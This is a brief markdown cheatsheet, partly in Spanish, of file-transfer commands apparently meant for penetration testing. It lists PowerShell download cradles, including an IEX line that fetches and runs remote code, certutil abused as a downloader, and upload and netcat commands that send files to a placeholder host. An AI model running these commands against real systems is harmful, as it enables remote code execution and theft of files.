# Cheatsheet ⚙

## Windows Methods 🔌

| Comando |
|:---:|
| **Descargar Archivos** ⏬|
| **`(New-Object Net.WebClient).DownloadFile('[URL]', '[File Output]')`** |
| **`IEX(New-Object Net.WebClient).DownloadString('[URL]')`** |
| **`Invoke-WebRequest [URL] -OutFile "[Filename Output]"`** |
| **`[IO.File]::WriteAllBytes("<Path Destino>", Convert.Frombase64String("<Data64>"))`** |
| **`(New-Object Net.WebClient).downloadFile('ftp://<IP>/<File>', '<Output File>')`** |
| **`certutil.exe -verifyctl -split -f http://<IP>/<File>`** |
| **Subir Archivos** ⏫ |
| **`copy "<File>" \\<IP>\<Share>`** |
| **`(New-Object Net.WebClient).UploadFile('fpt://<IP>/<Name File>', "[Archivo Local]")`** |

## Linux Methods 🐧

| Comando |
|:---:|
| **Send File:** `nc --send-only <IP> <Port> < [File To Transfer]`** |
| **Receive File:** `nc -l -p <Port> --recv-only > [File Name Output]` |
